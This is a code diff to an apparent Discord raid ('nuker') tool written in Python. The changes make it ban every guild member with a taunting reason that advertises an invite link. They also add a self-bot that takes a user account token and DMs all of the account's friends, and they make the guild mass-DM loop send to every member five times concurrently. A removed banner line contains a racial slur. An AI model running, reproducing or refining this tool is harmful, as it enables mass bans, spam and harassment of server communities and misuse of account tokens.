@@ -8,6 +8,9 @@ import time
 import aiohttp
 import random
 import asyncio
+import ctypes
+import click
+import os
 
 TOKEN_TYPE_BOT = 1
 TOKEN_TYPE_ACCOUNT = 2
@@ -116,16 +119,15 @@ def create_channels(token, guild_id, channel_names, amount):
 
 def ban_all_members(token, guild_id):
     headers = {
-        'Authorization': f'{token_type_to_str(TOKEN_TYPE)} {token}',
+        'Authorization': f'Bot {token}',
     }
 
-
     cursor = None
+    default_ban_reason = 'Join discord.gg/FGH YOU noobie'  # Default ban reason
 
     while True:
-
         params = {
-            'limit': 1000,  
+            'limit': 1000,
             'after': cursor,
         }
 
@@ -135,17 +137,19 @@ def ban_all_members(token, guild_id):
             members = response.json()
 
             if not members:
-                break  
+                break
 
             for member in members:
                 if 'user' in member:
                     user_id = member['user']['id']
-                    response = requests.put(f'https://discord.com/api/v10/guilds/{guild_id}/bans/{user_id}', headers=headers)
+                    data = {
+                        'reason': default_ban_reason  # Use the default ban reason
+                    }
+                    response = requests.put(f'https://discord.com/api/v10/guilds/{guild_id}/bans/{user_id}', headers=headers, json=data)
                     if response.status_code == 204:
-                        print(f"Banned user: {user_id}")
+                        print(f"Banned user: {user_id} for reason: {default_ban_reason}")
                     else:
                         print(f"Failed to ban user {user_id}: {response.text}")
-
 
             cursor = members[-1]['user']['id']
 
@@ -223,15 +227,35 @@ async def chat_with_webhooks(webhooks, message):
       
         await asyncio.sleep(0)  
 
-def mass_dm_friends(token, message):
-    friends = get_friends(token)
+def mass_dm_friends():
+    windowSize = 'mode 85,20'
+    os.system(windowSize)
+    ctypes.windll.kernel32.SetConsoleTitleW("FGH")
+    click.clear()
+    client = discord.Client()
 
-    if friends:
-        for friend in friends:
-            friend_id = friend['id']
-            dm_friend(token, friend_id, message)
-    else:
-        print("No friends found.")
+    global auth
+    auth = input('Enter your account token: ')  # Use an account token here
+
+    try:
+        ctypes.windll.kernel32.SetConsoleTitleW(f"{os.getlogin()} | Token: {auth}")
+    except:
+        ctypes.windll.kernel32.SetConsoleTitleW(f"FGH's Client | Token: {auth}")
+
+    message = input('FGH@message: ')
+    click.clear()
+
+    @client.event
+    async def on_ready():
+        print(f'Logged in as {client.user.name}')
+        for user in client.user.friends:
+            try:
+                await user.send(message)
+            except:
+                pass
+
+    client.run(auth, bot=False)
+
 
 def create_webhooks_for_channels(token, guild_id):
     headers = {
@@ -296,7 +320,7 @@ def main():
     █████╗░░░░░██║░░██╗░░░░███████║
     ██╔══╝░░░░░██║░░╚██╗░░░██╔══██║
     ██║░░░░░██╗╚██████╔╝██╗██║░░██║
-    ╚═╝░░░░░╚═╝░╚═════╝░╚═╝╚═╝░░╚═╝ don't skid nigga get off my dick
+    ╚═╝░░░░░╚═╝░╚═════╝░╚═╝╚═╝░░╚═╝ don't skid pwease :3
     """
 
     print_rainbow_title(title)
@@ -410,21 +434,26 @@ def main():
                                 guild = client.get_guild(int(GUILD_ID))
                                 if guild:
                                     print(f'Found guild: {guild.name} (ID: {guild.id})')
-                                    for member in guild.members:
-                                        if member.id != client.user.id:
-                                            try:
-                                                print(f'sending message to > {member.name}')
-                                                await member.send(message)
-                                                print(f'done sending to > {member.name}')
-                                            except discord.Forbidden:
-                                                print(f'Failed to send message to {member.name} (dms may be disabled for the guy OR your bot is limit REFRESH PAGE)')
-                                            except Exception as e:
-                                                print(f'Error sending message to {member.name}#{member.discriminator}: {e}')
-                                            await asyncio.sleep(12)  
+                                    
+                                    for _ in range(5): 
+                                        send_tasks = []
+                                        for member in guild.members:
+                                            if member.id != client.user.id:
+                                                try:
+                                                    print(f'Sending message to > {member.name}')
+                                                    send_tasks.append(member.send(message))
+                                                except discord.Forbidden:
+                                                    print(f'Failed to send message to {member.name} (DMs may be disabled for the user or your bot is rate limited)')
+                                                except Exception as e:
+                                                    print(f'Error sending message to {member.name}#{member.discriminator}: {e}')
+                                        await asyncio.gather(*send_tasks)
+                                        await asyncio.sleep(6) 
+                                    await client.close()
                                 else:
-                                    print(f'Guild  ID {GUILD_ID} not found')
+                                    print(f'Guild ID {GUILD_ID} not found')
                             except Exception as e:
                                 print(f'Error: {e}')
+
 
                         @client.event
                         async def on_disconnect():
